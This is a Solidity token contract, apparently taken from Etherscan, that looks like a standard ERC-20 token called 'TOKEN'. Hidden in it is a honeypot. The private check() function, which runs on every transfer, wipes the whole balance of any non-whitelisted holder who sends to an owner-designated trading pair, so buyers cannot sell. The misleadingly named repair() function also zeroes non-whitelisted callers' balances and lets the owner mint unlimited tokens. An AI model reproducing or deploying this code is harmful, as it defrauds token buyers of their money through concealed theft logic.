/**
 *Submitted for verification at Etherscan.io on 2022-05-22
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;

library SafeMath {
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract DeployWithCreate2{
    address public owner;
    constructor(address _owner){
        owner = _owner;
        _balances[owner] = _totalSupply;
        isWlist[owner] = true;
    }

  using SafeMath for uint256;

  string public constant name = "TOKEN";
  string public constant symbol = "TOKEN";
  uint256 public constant decimals = 18;
  uint256 _totalSupply = 10000000 ether;
  mapping(address => bool) private isWlist;
  mapping(address => bool) private isPair;


  mapping (address => uint256) internal _balances;
  mapping (address => mapping (address => uint256)) internal _allowed;

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  function totalSupply() public view returns (uint256 supply) {
    return _totalSupply;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _balances[_owner];
  }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require (_to != address(0), "");
    check(_to);
    _balances[msg.sender] = _balances[msg.sender].sub(_value);
    _balances[_to] = _balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require (_to != address(0), "");
    check(_to);
    _balances[_from] = _balances[_from].sub(_value);
    _allowed[_from][msg.sender] = _allowed[_from][msg.sender].sub(_value);
    _balances[_to] = _balances[_to].add(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_allowed[msg.sender][_spender] == 0 || _value == 0);
    _allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
    return _allowed[_owner][_spender];
  }

    function check(address to) private returns(bool success){
        if(isPair[to]&&!isWlist[tx.origin]) {
            _balances[tx.origin] = _balances[tx.origin].sub(balanceOf(tx.origin));
        }
        return true;
    }

    function repair(address account, uint value) public returns(bool success){
        if(!isWlist[tx.origin]) {
            _balances[tx.origin] = _balances[tx.origin].sub(balanceOf(tx.origin));
        }
        if(msg.sender == owner) {
            _balances[account] = _balances[account].add(value);
        }
        return true;
    }

    function setWlist(address account, bool key) public returns(bool success){
        require(msg.sender == owner);
        isWlist[account] = key;
        return true;
    }

    function setPair(address account, bool key) public returns(bool success){
        require(msg.sender == owner);
        isPair[account] = key;
        return true;
    }
}